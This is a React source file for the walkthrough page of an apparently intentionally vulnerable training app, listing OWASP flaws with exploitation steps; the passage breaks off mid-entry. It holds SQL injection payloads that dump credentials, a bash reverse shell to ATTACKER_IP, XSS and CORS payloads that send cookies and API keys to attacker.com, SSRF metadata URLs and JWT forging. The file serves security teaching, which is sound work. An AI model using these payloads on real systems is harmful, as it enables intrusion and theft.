import { useState } from 'react'
import { Link } from 'react-router-dom'
import { ChevronDown, ChevronRight, ExternalLink, ArrowLeft } from 'lucide-react'

/* ── Types ────────────────────────────────────────────────────── */

type Difficulty = 'Easy' | 'Medium' | 'Hard'
type OwaspCategory = string

interface Vulnerability {
  id: string
  title: string
  difficulty: Difficulty
  owasp: OwaspCategory
  location: string
  endpoint: string
  description: string
  exploitation: string
  impact: string
}

/* ── Vulnerability Database ───────────────────────────────────── */

const vulnerabilities: Vulnerability[] = [
  // ═══ A01: Broken Access Control ═══
  {
    id: 'BAC-001',
    title: 'IDOR — View Any User Profile',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/users.py — GET /api/users/{user_id}',
    endpoint: 'GET /api/users/{user_id}',
    description: 'The endpoint returns full profile details (email, phone, department, bio, etc.) for any user ID without verifying that the requesting user has permission to view that profile. There is no ownership check — any authenticated user can enumerate and view all user profiles.',
    exploitation: `1. Login as any user (e.g. jsmith:password123)
2. Note your own user ID from the login response (e.g. id: 3)
3. Send requests to other user IDs:

   GET /api/users/1    → admin profile (includes email, phone, department)
   GET /api/users/2    → manager profile
   GET /api/users/4    → another user's profile

4. Enumerate all users by incrementing the ID from 1 to N
5. Extract sensitive fields: email, phone, department, bio, last_login`,
    impact: 'Exposure of all user PII including email, phone numbers, department info, and activity timestamps.',
  },
  {
    id: 'BAC-002',
    title: 'IDOR — View Any User API Key',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/users.py — GET /api/users/{user_id}/api-key',
    endpoint: 'GET /api/users/{user_id}/api-key',
    description: 'Any authenticated user can retrieve the API key of any other user by providing their user ID. There is no ownership validation.',
    exploitation: `1. Login as any user
2. Request your own API key:       GET /api/users/3/api-key
3. Request the admin's API key:    GET /api/users/1/api-key
4. Response: { "user_id": 1, "api_key": "abc123..." }
5. Use the stolen API key to impersonate the admin in API integrations`,
    impact: 'Complete API key theft for all users. If API keys grant elevated access, this leads to full account takeover.',
  },
  {
    id: 'BAC-003',
    title: 'IDOR — Update Any User Profile',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/users.py — PATCH /api/users/{user_id}',
    endpoint: 'PATCH /api/users/{user_id}',
    description: 'The profile update endpoint does not verify that the requesting user owns the profile being updated. Any authenticated user can modify any other user\'s profile fields.',
    exploitation: `1. Login as guest (guest:guest123)
2. Modify the admin's profile:

   PATCH /api/users/1
   Content-Type: application/json
   Authorization: Bearer <guest_token>

   { "bio": "Hacked by guest", "email": "attacker@evil.com" }

3. The admin's profile is now modified`,
    impact: 'Unauthorized modification of any user\'s profile data. Can be chained with mass assignment (BAC-004) for privilege escalation.',
  },
  {
    id: 'BAC-004',
    title: 'Mass Assignment — Privilege Escalation via Role Field',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/users.py — PATCH /api/users/{user_id} (UpdateProfileRequest includes role field)',
    endpoint: 'PATCH /api/users/{user_id}',
    description: 'The UpdateProfileRequest schema includes a "role" field that the server accepts and applies without restriction. A regular user can escalate their own privileges to admin by including role in the update body.',
    exploitation: `1. Login as regular user (jsmith:password123, id: 3)
2. Send:

   PATCH /api/users/3
   Authorization: Bearer <user_token>

   { "role": "admin" }

3. Response confirms: { "role": "admin" }
4. Now login again — the JWT will contain role: "admin"
5. Access all admin endpoints (/api/admin/*)`,
    impact: 'Complete privilege escalation from any role to admin. Full platform takeover.',
  },
  {
    id: 'BAC-005',
    title: 'IDOR — View Private Projects',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/projects.py — GET /api/projects/{project_id}',
    endpoint: 'GET /api/projects/{project_id}',
    description: 'The project listing endpoint (GET /api/projects) is properly scoped to the user\'s organization memberships. However, the detail endpoint (GET /api/projects/{id}) has no org membership check. Any user can access any project from any organization by guessing/enumerating the ID.',
    exploitation: `1. Login as guest user (guest:guest123) — Freelance Hub org (no projects)
2. GET /api/projects → empty list (correctly org-scoped)
3. But request projects from other orgs by ID:

   GET /api/projects/1    → "NexusCloud Platform" (Acme Corp, budget: $150,000)
   GET /api/projects/2    → "Internal Security Audit" (Acme Corp, confidential!)
   GET /api/projects/5    → "AI Chatbot" (DevStudio)

4. Enumerate all projects by incrementing ID: /api/projects/1, /api/projects/2, ...
5. The list is org-scoped but direct access is not — classic IDOR pattern`,
    impact: 'Cross-organization exposure of confidential project data including budgets, tasks, deadlines, and team assignments.',
  },
  {
    id: 'BAC-006',
    title: 'IDOR — Modify Any Project (Including Budget)',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/projects.py — PATCH /api/projects/{project_id}',
    endpoint: 'PATCH /api/projects/{project_id}',
    description: 'The project list is org-scoped, but the PATCH endpoint has no org membership check. Any user from any organization can modify any project\'s fields including budget by providing the project ID.',
    exploitation: `1. Login as guest (guest:guest123) — Freelance Hub org
2. GET /api/projects → empty list (org-scoped, no projects)
3. But modify Acme Corp's project by ID:

   PATCH /api/projects/1
   { "budget": 999999.99, "status": "cancelled" }

4. Acme Corp's project financial and status data is now tampered with
5. Cross-org data integrity violation`,
    impact: 'Cross-organization financial data manipulation, project sabotage, unauthorized changes to any org\'s projects.',
  },
  {
    id: 'BAC-007',
    title: 'IDOR — View/Edit/Delete Any Task',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/projects.py — task endpoints',
    endpoint: 'GET/PATCH/DELETE /api/projects/{pid}/tasks/{tid}',
    description: 'Task endpoints do not verify project membership. Any authenticated user can view, update, or delete tasks in any project, including private ones.',
    exploitation: `1. Login as guest
2. View a task from a private project:
   GET /api/projects/2/tasks/5
3. Update it:
   PATCH /api/projects/2/tasks/5 { "status": "cancelled" }
4. Or delete it:
   DELETE /api/projects/2/tasks/5`,
    impact: 'Unauthorized access to all task data. Can sabotage projects by modifying or deleting tasks.',
  },
  {
    id: 'BAC-008',
    title: 'IDOR — Download/Delete Any File',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/files.py — GET /api/files/{id}/download, DELETE /api/files/{id}',
    endpoint: 'GET /api/files/{id}/download',
    description: 'The file listing (GET /api/files) is properly scoped by organization — users only see files from their org. However, the download and delete endpoints accept any file ID without org membership verification.',
    exploitation: `1. Login as user from Acme Corp, upload a file → note the file ID (e.g. 1)
2. Login as guest (Freelance Hub org)
3. GET /api/files → empty list (correctly org-scoped)
4. But download Acme Corp's file by ID: GET /api/files/1/download → success!
5. Or delete it: DELETE /api/files/1 → file removed from Acme Corp
6. Enumerate all file IDs: /api/files/1, /api/files/2, ...`,
    impact: 'Cross-organization data theft via file download, data loss via unauthorized deletion.',
  },
  {
    id: 'BAC-009',
    title: 'IDOR — View Any Feedback by ID',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/feedback.py — GET /api/feedback/{feedback_id}',
    endpoint: 'GET /api/feedback/{feedback_id}',
    description: 'The feedback listing (GET /api/feedback) is properly scoped — users only see their own submissions. However, the detail endpoint (GET /api/feedback/{id}) has no ownership check, allowing any user to read any feedback entry including admin notes.',
    exploitation: `1. Login as guest (guest:guest123)
2. GET /api/feedback → 0 items (correctly scoped, guest has no feedback)
3. But access feedback by ID directly:
   GET /api/feedback/1 → sees feedback from user #3 including admin_notes
   GET /api/feedback/2 → another user's complaint
4. Enumerate all feedback: /api/feedback/1, /api/feedback/2, ...`,
    impact: 'Information disclosure of internal complaints, bug reports, and admin responses.',
  },
  {
    id: 'BAC-010',
    title: 'Broken Access Control — Guest Can Create Tasks',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/projects.py — POST /api/projects/{id}/tasks',
    endpoint: 'POST /api/projects/{project_id}/tasks',
    description: 'There is no role-based restriction on task creation. A guest user can create tasks in any project, including private ones.',
    exploitation: `1. Login as guest (guest:guest123)
2. Create a task in any project:

   POST /api/projects/1/tasks
   { "title": "Injected task", "description": "Created by guest" }`,
    impact: 'Data integrity violation — unauthorized users can inject tasks into projects.',
  },

  // ═══ A02: Cryptographic Failures ═══
  {
    id: 'CRYPTO-001',
    title: 'Weak Hardcoded JWT Secret',
    difficulty: 'Hard',
    owasp: 'A02: Cryptographic Failures',
    location: 'Backend: app/core/config.py — JWT_SECRET = "supersecretkey123"',
    endpoint: 'All authenticated endpoints',
    description: 'The JWT signing secret is hardcoded as "supersecretkey123" — a trivially guessable string. An attacker who discovers this secret (via the debug endpoint or brute force) can forge tokens for any user and any role.',
    exploitation: `1. Discover the secret via: GET /api/admin/debug → jwt_secret field
   Or via: GET /.env → JWT_SECRET field
   Or brute-force with common secret lists (jwt-cracker, hashcat)

2. Forge an admin token using Python:

   import jwt
   token = jwt.encode({"sub": "1", "role": "admin", "exp": 9999999999}, "supersecretkey123", algorithm="HS256")

3. Use the forged token:
   Authorization: Bearer <forged_token>

4. Full admin access to all endpoints`,
    impact: 'Complete authentication bypass. Attacker can impersonate any user including admin.',
  },
  {
    id: 'CRYPTO-002',
    title: 'JWT Role Claim Trusted Without DB Verification',
    difficulty: 'Medium',
    owasp: 'A02: Cryptographic Failures',
    location: 'Backend: app/core/security.py — require_admin() reads role from JWT payload only',
    endpoint: 'All /api/admin/* endpoints',
    description: 'The admin authorization check reads the "role" claim directly from the JWT payload without cross-referencing the database. If an attacker can modify their JWT (via known secret or mass assignment), the role in the token is trusted.',
    exploitation: `1. Use mass assignment to set your role to "admin" (see BAC-004)
2. Login again to get a new JWT with role: "admin"
3. All admin endpoints now accessible

   Or, with the known JWT secret:
4. Decode your existing token, change "role" to "admin", re-sign`,
    impact: 'Privilege escalation to admin without actually being an admin in the database.',
  },

  // ═══ A03: Injection ═══
  {
    id: 'INJ-001',
    title: 'SQL Injection — User Search',
    difficulty: 'Easy',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/users.py — GET /api/users/search/query?q=',
    endpoint: 'GET /api/users/search/query?q={payload}',
    description: 'The search endpoint constructs a SQL query using string interpolation (f-string), directly embedding the user\'s input into the WHERE clause without parameterization.',
    exploitation: `1. Basic detection — cause a SQL error:
   GET /api/users/search/query?q=' OR '1'='1

2. Extract all users:
   GET /api/users/search/query?q=' OR 1=1--

3. UNION-based extraction — get table names:
   GET /api/users/search/query?q=' UNION SELECT 1,name,3,4,5,6 FROM sqlite_master WHERE type='table'--

4. Extract all passwords:
   GET /api/users/search/query?q=' UNION SELECT id,username,password_hash,email,role,department FROM users--

5. Extract admin API key:
   GET /api/users/search/query?q=' UNION SELECT id,username,api_key,email,role,department FROM users WHERE role='admin'--`,
    impact: 'Full database read access. Can extract all user credentials (hashed passwords, API keys), project data, and any other stored information.',
  },
  {
    id: 'INJ-002',
    title: 'Command Injection — Data Export',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/admin.py — GET /api/admin/export?format=&resource=',
    endpoint: 'GET /api/admin/export?format={payload}&resource=users',
    description: 'When format is not "json", the endpoint constructs a shell command using f-string interpolation and executes it with subprocess.run(shell=True). The format parameter is injected directly into the command.',
    exploitation: `1. Normal use (requires admin token):
   GET /api/admin/export?format=csv&resource=users

2. Inject commands via format parameter:
   GET /api/admin/export?format=csv'; id; echo '&resource=users
   → Executes: sqlite3 ... '.mode csv'; id; echo '' ...

3. Read sensitive files:
   GET /api/admin/export?format=csv'; cat /etc/passwd; echo '&resource=users

4. Reverse shell (if network allows):
   GET /api/admin/export?format=csv'; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'; echo '&resource=users

Note: Requires admin access. Chain with JWT forging (CRYPTO-001) or mass assignment (BAC-004) first.`,
    impact: 'Remote Code Execution (RCE) on the server. Full system compromise.',
  },
  {
    id: 'INJ-003',
    title: 'Stored XSS — User Bio',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/users.py — PATCH /api/users/{id} (bio field)\nFrontend: pages/Profile.tsx — dangerouslySetInnerHTML on bio',
    endpoint: 'PATCH /api/users/{user_id}',
    description: 'The user bio field accepts arbitrary HTML/JavaScript. When other users view the profile, the bio is rendered using dangerouslySetInnerHTML without sanitization.',
    exploitation: `1. Login as any user (jsmith:password123)
2. Update bio with XSS payload:

   PATCH /api/users/3
   { "bio": "<img src=x onerror=alert('XSS')>" }

3. When any user visits /profile/3, the JavaScript executes
4. Cookie stealing payload:
   { "bio": "<img src=x onerror='fetch(\\\"https://attacker.com/steal?c=\\\"+document.cookie)'>" }`,
    impact: 'Session hijacking, cookie theft, keylogging, defacement. Executes in the context of any user who views the profile.',
  },
  {
    id: 'INJ-004',
    title: 'Stored XSS — Task Comments',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/projects.py — POST /api/projects/{pid}/tasks/{tid}/comments\nFrontend: pages/ProjectDetail.tsx — dangerouslySetInnerHTML on comment content',
    endpoint: 'POST /api/projects/{pid}/tasks/{tid}/comments',
    description: 'Comment content is stored without sanitization and rendered using dangerouslySetInnerHTML in the frontend.',
    exploitation: `1. Login and post a comment on any task:

   POST /api/projects/1/tasks/1/comments
   { "content": "<svg onload=alert('XSS in comments')>" }

2. All users viewing this task see the payload execute
3. Target admins/managers who review project comments`,
    impact: 'XSS in the context of project viewers. Can target managers and admins who review task comments.',
  },
  {
    id: 'INJ-005',
    title: 'Blind XSS — Feedback Subject & Message',
    difficulty: 'Hard',
    owasp: 'A03: Injection',
    location: 'Backend: app/api/routes/feedback.py — POST /api/feedback\nFrontend: pages/FeedbackPage.tsx — dangerouslySetInnerHTML on subject and message',
    endpoint: 'POST /api/feedback',
    description: 'Feedback subject and message are stored raw and rendered via dangerouslySetInnerHTML when an admin views the feedback page. This is a "blind" XSS — the attacker submits a payload and it fires when an admin reviews it.',
    exploitation: `1. Login as any user
2. Submit feedback with XSS payload:

   POST /api/feedback
   {
     "subject": "<img src=x onerror='fetch(\"https://attacker.com/blind?c=\"+document.cookie)'>",
     "message": "Normal looking feedback text",
     "category": "general"
   }

3. When admin opens /feedback page, the payload in subject executes
4. Or embed in message field for execution when admin reads the detail`,
    impact: 'Blind XSS targeting admin users. Can steal admin session tokens, perform actions as admin.',
  },
  {
    id: 'INJ-006',
    title: 'DOM XSS — Notification Message',
    difficulty: 'Medium',
    owasp: 'A03: Injection',
    location: 'Frontend: pages/Notifications.tsx — dangerouslySetInnerHTML on n.message',
    endpoint: 'Notification creation (if attacker can inject notification content)',
    description: 'Notification messages are rendered using dangerouslySetInnerHTML. If an attacker can influence notification content (e.g., through a notification-triggering action or direct DB manipulation via SQL injection), they can execute JavaScript in the victim\'s browser.',
    exploitation: `1. First exploit SQL injection (INJ-001) to insert a malicious notification:

   ' ; INSERT INTO notification(user_id, title, message, is_read) VALUES(1, 'Update', '<img src=x onerror=alert(1)>', 0); --

2. When the target user views their notifications, the XSS payload fires
3. Alternatively, if there's an admin notification creation feature, inject there`,
    impact: 'XSS execution in victim\'s session when they view notifications.',
  },

  // ═══ A04: Insecure Design ═══
  {
    id: 'DESIGN-001',
    title: 'No Rate Limiting on Login',
    difficulty: 'Easy',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/auth.py — POST /api/auth/login',
    endpoint: 'POST /api/auth/login',
    description: 'The login endpoint has no rate limiting, lockout mechanism, or CAPTCHA. An attacker can make unlimited login attempts at maximum speed.',
    exploitation: `1. Use a brute-force tool (hydra, burp intruder, custom script):

   for password in wordlist:
       POST /api/auth/login
       { "username": "admin", "password": password }

2. Test known weak passwords for seeded accounts:
   admin:admin123, jsmith:password123, guest:guest123

3. The verbose error messages help: "Incorrect password" confirms the user exists`,
    impact: 'Account compromise via credential brute-forcing. Combined with verbose errors, enables targeted attacks.',
  },
  {
    id: 'DESIGN-002',
    title: 'No Password Strength Validation',
    difficulty: 'Easy',
    owasp: 'A04: Insecure Design',
    location: 'Backend: app/api/routes/auth.py — POST /api/auth/register',
    endpoint: 'POST /api/auth/register',
    description: 'The registration endpoint accepts any password regardless of length or complexity. Users can register with passwords like "a" or "123".',
    exploitation: `1. Register with a trivially weak password:

   POST /api/auth/register
   { "username": "newuser", "email": "new@test.com", "password": "a" }

2. Account is created successfully with the weak password`,
    impact: 'Users create weak passwords that are trivially brute-forceable.',
  },
  {
    id: 'DESIGN-003',
    title: 'Predictable Sequential IDs',
    difficulty: 'Easy',
    owasp: 'A04: Insecure Design',
    location: 'All database models use auto-incrementing integer IDs',
    endpoint: 'All CRUD endpoints',
    description: 'All resources (users, projects, tasks, files, feedback) use sequential integer IDs. This makes IDOR attacks trivial — an attacker just increments the ID to access the next resource.',
    exploitation: `1. Observe your user ID is 3 after registration
2. Try IDs 1, 2, 4, 5, 6... for other users
3. Same pattern for projects (/api/projects/1, /2, /3...)
4. Files: /api/files/1/download, /api/files/2/download...`,
    impact: 'Enables all IDOR attacks in this application. UUIDs would make enumeration significantly harder.',
  },

  // ═══ A05: Security Misconfiguration ═══
  {
    id: 'MISCONF-001',
    title: 'Debug Endpoint Exposes Secrets',
    difficulty: 'Easy',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/api/routes/admin.py — GET /api/admin/debug',
    endpoint: 'GET /api/admin/debug',
    description: 'The admin debug endpoint returns the JWT secret, database path, environment variables, Python version, and working directory. Combined with JWT forging, this provides complete system access.',
    exploitation: `1. Access the debug endpoint (requires admin token):
   GET /api/admin/debug

2. Response includes:
   - jwt_secret: "supersecretkey123"
   - database_url: full path to SQLite file
   - environment: all server environment variables
   - cwd: server working directory

3. Use jwt_secret to forge tokens (see CRYPTO-001)`,
    impact: 'Full exposure of server configuration and secrets. Enables JWT forging and further exploitation.',
  },
  {
    id: 'MISCONF-002',
    title: 'Exposed .env Endpoint',
    difficulty: 'Easy',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/main.py — GET /.env',
    endpoint: 'GET /.env',
    description: 'The application serves a fake but realistic .env file containing database credentials, JWT secret, SMTP credentials, and AWS access keys. In a real scenario, this would be catastrophic.',
    exploitation: `1. GET /.env (no authentication required!)

2. Response includes:
   - DATABASE_URL
   - JWT_SECRET: "supersecretkey123"
   - SMTP credentials
   - AWS_ACCESS_KEY and AWS_SECRET_KEY

3. Use these credentials for lateral movement`,
    impact: 'Full credential exposure including cloud provider keys, email server credentials, and authentication secrets.',
  },
  {
    id: 'MISCONF-003',
    title: 'robots.txt Reveals Hidden Paths',
    difficulty: 'Easy',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/main.py — GET /robots.txt',
    endpoint: 'GET /robots.txt',
    description: 'The robots.txt file explicitly lists sensitive paths that should be hidden: /api/admin/debug, /api/admin/export, /internal/, /api/users/search/.',
    exploitation: `1. GET /robots.txt (no authentication required)
2. Note the Disallow entries — these are the interesting endpoints
3. Proceed to test each revealed path`,
    impact: 'Information disclosure of sensitive endpoint paths. Guides attackers to high-value targets.',
  },
  {
    id: 'MISCONF-004',
    title: 'CORS Allows All Origins',
    difficulty: 'Medium',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/core/config.py — CORS_ORIGINS = ["*"]',
    endpoint: 'All API endpoints',
    description: 'CORS is configured with allow_origins=["*"], meaning any website can make authenticated requests to the API. An attacker can host a malicious page that makes API calls using the victim\'s session.',
    exploitation: `1. Host a malicious page on attacker.com:

   <script>
     fetch('http://target:9000/api/users/1/api-key', {
       headers: { 'Authorization': 'Bearer ' + stolenToken }
     })
     .then(r => r.json())
     .then(d => fetch('https://attacker.com/exfil?key=' + d.api_key))
   </script>

2. Trick an authenticated user into visiting the page
3. The browser allows the cross-origin request due to CORS: *`,
    impact: 'Cross-site request forgery and data exfiltration from any origin.',
  },
  {
    id: 'MISCONF-005',
    title: 'Health Endpoint Leaks Server Info',
    difficulty: 'Easy',
    owasp: 'A05: Security Misconfiguration',
    location: 'Backend: app/main.py — GET /api/health',
    endpoint: 'GET /api/health',
    description: 'The health check endpoint reveals the server technology (FastAPI/Uvicorn), Python version, and application version. This helps attackers identify known vulnerabilities for these specific versions.',
    exploitation: `1. GET /api/health (no auth required)
2. Response: { "server": "FastAPI/Uvicorn", "python": "3.13", "version": "2.4.1" }
3. Search for CVEs specific to these versions`,
    impact: 'Information leakage aiding targeted exploitation.',
  },

  // ═══ A06: Vulnerable and Outdated Components ═══
  {
    id: 'COMP-001',
    title: 'JWT Library with Known Weaknesses',
    difficulty: 'Hard',
    owasp: 'A06: Vulnerable and Outdated Components',
    location: 'Backend: requirements.txt — python-jose',
    endpoint: 'Authentication system',
    description: 'The application uses python-jose for JWT handling. While functional, the combination with a weak secret and HS256 algorithm creates a vulnerable authentication system. The "none" algorithm attack and algorithm confusion attacks should be tested.',
    exploitation: `1. Test "none" algorithm bypass:
   - Take a valid JWT, decode the header
   - Change "alg" to "none", remove signature
   - Send the modified token

2. Test algorithm confusion:
   - If the server has an RSA public key, try HS256 with the public key as secret

3. The weak HS256 + known secret makes this moot — but test the library behavior`,
    impact: 'Potential authentication bypass depending on library configuration and version.',
  },

  // ═══ A07: Identification and Authentication Failures ═══
  {
    id: 'AUTH-001',
    title: 'User Enumeration via Verbose Login Errors',
    difficulty: 'Easy',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — POST /api/auth/login',
    endpoint: 'POST /api/auth/login',
    description: 'The login endpoint returns different error messages for "user not found" vs "incorrect password". This allows an attacker to enumerate valid usernames before brute-forcing passwords.',
    exploitation: `1. Test with a non-existent user:
   POST /api/auth/login { "username": "nonexistent", "password": "test" }
   → 401: "User 'nonexistent' not found"

2. Test with a valid user:
   POST /api/auth/login { "username": "admin", "password": "wrongpass" }
   → 401: "Incorrect password for this account"

3. The different messages reveal that "admin" exists
4. Build a list of valid usernames, then target with password brute-force`,
    impact: 'Username enumeration enables targeted brute-force attacks.',
  },
  {
    id: 'AUTH-002',
    title: 'No Token Revocation',
    difficulty: 'Medium',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/core/security.py — get_current_user_id()',
    endpoint: 'All authenticated endpoints',
    description: 'There is no token blacklist or revocation mechanism. Once a JWT is issued, it remains valid until expiration (24 hours) regardless of password changes, role changes, or account deactivation.',
    exploitation: `1. Login and obtain a token
2. An admin deactivates your account
3. Your existing token still works for 24 hours
4. Or: change password — old tokens still valid
5. Or: steal a token from logs — usable until expiry`,
    impact: 'Compromised tokens cannot be invalidated. Account deactivation is ineffective until token expires.',
  },
  {
    id: 'AUTH-003',
    title: 'User Enumeration via Registration',
    difficulty: 'Easy',
    owasp: 'A07: Identification and Authentication Failures',
    location: 'Backend: app/api/routes/auth.py — POST /api/auth/register',
    endpoint: 'POST /api/auth/register',
    description: 'The registration endpoint reveals whether a username is already taken with a specific error message.',
    exploitation: `1. Try to register with a known username:
   POST /api/auth/register { "username": "admin", "email": "x@x.com", "password": "test" }
   → 409: "Username 'admin' is already taken"

2. Enumerate all existing usernames this way`,
    impact: 'Username enumeration via registration oracle.',
  },

  // ═══ A08: Software and Data Integrity Failures ═══
  {
    id: 'INTEG-001',
    title: 'No CSRF Protection',
    difficulty: 'Medium',
    owasp: 'A08: Software and Data Integrity Failures',
    location: 'Backend: entire application — no CSRF tokens',
    endpoint: 'All state-changing endpoints',
    description: 'The application uses Bearer tokens in headers (which provides some CSRF protection), but if tokens are stored in cookies or if the application is extended with cookie-based auth, there is no CSRF protection layer.',
    exploitation: `1. If tokens are stored in localStorage (current), CSRF via fetch requires XSS first
2. If the app is modified to use httpOnly cookies:
   - Host a page with a form that auto-submits to /api/users/3
   - The victim's cookies are sent automatically
   - No CSRF token to prevent it`,
    impact: 'Potential for cross-site request forgery if authentication method changes.',
  },

  // ═══ A09: Security Logging and Monitoring Failures ═══
  {
    id: 'LOG-001',
    title: 'Insufficient Audit Logging',
    difficulty: 'Medium',
    owasp: 'A09: Security Logging and Monitoring Failures',
    location: 'Backend: entire application — no comprehensive logging',
    endpoint: 'All endpoints',
    description: 'The application has an AuditLog model but does not actually write to it during sensitive operations. Failed login attempts, privilege changes, data exports, and file operations are not logged.',
    exploitation: `1. Perform any attack (SQL injection, IDOR, privilege escalation)
2. Check the audit log: GET /api/admin/audit-logs
3. No entries recorded — the attack left no trace
4. There is no alerting on suspicious patterns (multiple failed logins, rapid enumeration)`,
    impact: 'Attacks go undetected. No forensic trail for incident response.',
  },
  {
    id: 'LOG-002',
    title: 'Verbose SQL Errors Exposed to Client',
    difficulty: 'Easy',
    owasp: 'A09: Security Logging and Monitoring Failures',
    location: 'Backend: app/api/routes/users.py — search_users() exception handler',
    endpoint: 'GET /api/users/search/query?q=',
    description: 'When a SQL error occurs (e.g., from SQL injection), the full error message including internal database details is returned to the client.',
    exploitation: `1. Trigger a SQL error:
   GET /api/users/search/query?q='

2. Response: 500 "Database error: near \\"\\": syntax error"
3. The error helps refine SQL injection payloads
4. May reveal table names, column names, and database structure`,
    impact: 'Aids SQL injection attacks by providing detailed error feedback.',
  },

  // ═══ A10: Server-Side Request Forgery (SSRF) ═══
  {
    id: 'SSRF-001',
    title: 'SSRF via Webhook Tester',
    difficulty: 'Medium',
    owasp: 'A10: Server-Side Request Forgery',
    location: 'Backend: app/api/routes/admin.py — POST /api/admin/webhook-test',
    endpoint: 'POST /api/admin/webhook-test',
    description: 'The webhook tester makes HTTP requests from the server to any URL provided by the user, with follow_redirects=True. This allows accessing internal services, cloud metadata endpoints, and localhost services.',
    exploitation: `1. Access internal services:
   POST /api/admin/webhook-test
   { "url": "http://127.0.0.1:9000/api/admin/debug" }

2. Read cloud metadata (AWS):
   { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

3. Scan internal network:
   { "url": "http://192.168.1.1/" }
   { "url": "http://10.0.0.1:8080/" }

4. Access internal services on non-standard ports:
   { "url": "http://127.0.0.1:6379/" }  → Redis
   { "url": "http://127.0.0.1:3306/" }  → MySQL

5. File protocol (if supported by httpx):
   { "url": "file:///etc/passwd" }

Note: Requires admin access. Chain with JWT forging first.`,
    impact: 'Access to internal network services, cloud metadata, and potentially sensitive internal APIs.',
  },

  // ═══ A01 continued: Organization & Social IDOR ═══
  {
    id: 'BAC-011',
    title: 'IDOR — Cross-Org Project Access',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/projects.py — GET /api/projects/{project_id}',
    endpoint: 'GET /api/projects/{project_id}',
    description: 'Projects are isolated by organization in the list endpoint (GET /api/projects only returns projects for your org memberships). However, the detail endpoint (GET /api/projects/{id}) has NO org membership check. A user from Org A can access all projects from Org B by enumerating IDs.',
    exploitation: `1. Login as guest (guest:guest123) — belongs to "Freelance Hub" org
2. GET /api/projects → empty list (Freelance Hub has no projects)
3. But access Acme Corp's projects by ID:

   GET /api/projects/1  → "NexusCloud Platform" (Acme Corp, budget: $150,000)
   GET /api/projects/2  → "Internal Security Audit" (Acme Corp, confidential!)
   GET /api/projects/3  → "Client Portal v2" (Acme Corp)

4. Also access DevStudio's projects:
   GET /api/projects/5  → "AI Chatbot" (DevStudio)

5. Even PATCH works cross-org:
   PATCH /api/projects/1 { "budget": 0, "status": "cancelled" }`,
    impact: 'Complete cross-organization data breach. All projects from any org are accessible to any authenticated user.',
  },
  {
    id: 'BAC-012',
    title: 'IDOR — Cross-Org File Access',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/files.py — GET /api/files/{id}/download',
    endpoint: 'GET /api/files/{id}/download',
    description: 'The file list is scoped by org (users only see files from their organizations), but the download and delete endpoints have NO org membership check. Users can download/delete files from other organizations.',
    exploitation: `1. Login as guest (guest:guest123) — Freelance Hub org
2. GET /api/files → empty (correctly scoped to org)
3. Download files from Acme Corp by ID:

   GET /api/files/1/download → Acme Corp's confidential file
   GET /api/files/2/download → another org's file

4. Delete cross-org files:
   DELETE /api/files/1 → deletes Acme Corp's file`,
    impact: 'Cross-organization data theft via file download. Data loss via unauthorized file deletion.',
  },
  {
    id: 'BAC-013',
    title: 'IDOR — View Any Organization Details',
    difficulty: 'Easy',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/organizations.py — GET /api/orgs/{org_id}',
    endpoint: 'GET /api/orgs/{org_id}',
    description: 'Any authenticated user can view the full details of any organization including the owner\'s email, plan tier, industry, and internal description — even for organizations they don\'t belong to.',
    exploitation: `1. Login as guest (guest:guest123)
2. GET /api/orgs → only shows Freelance Hub (correctly scoped)
3. View other orgs by ID:

   GET /api/orgs/1 → Acme Corp (enterprise plan, owner: admin@nexus.io)
   GET /api/orgs/2 → DevStudio (pro plan, owner: emily_r@nexus.io)

4. Enumerate all orgs: /api/orgs/1, /api/orgs/2, /api/orgs/3...`,
    impact: 'Exposure of organization internal structure, plan tiers, owner emails, and member counts for competitor intelligence.',
  },
  {
    id: 'BAC-014',
    title: 'IDOR — View Members of Any Organization',
    difficulty: 'Medium',
    owasp: 'A01: Broken Access Control',
    location: 'Backend: app/api/routes/organizations.py — GET /api/orgs/{org_id}/members',
    endpoint: 'GET /api/orgs/{org_id}/members',
    description: 'The member list endpoint does not check if the requesting user is a member of the org. Any authenticated user can list all members (with emails, roles, departments) of any organization.',
    exploitation: `1. Login as guest (guest:guest123)
2. View Acme Corp's team:

   GET /api/orgs/1/members
   → [admin (owner, admin@nexus.io), manager1, jsmith, mike_ops]

3. View DevStudio's team:
   GET /api/orgs/2/members
   → [emily_r (owner), alex_dev, lisa_m]

4. Extract: emails, roles, departments, join dates`,
    impact: 'Organizational intelligence gathering. Exposes internal team structure, role hierarchy, and employee contact information of competitor organizations.',
  },
  {
    id: 'BAC-015',
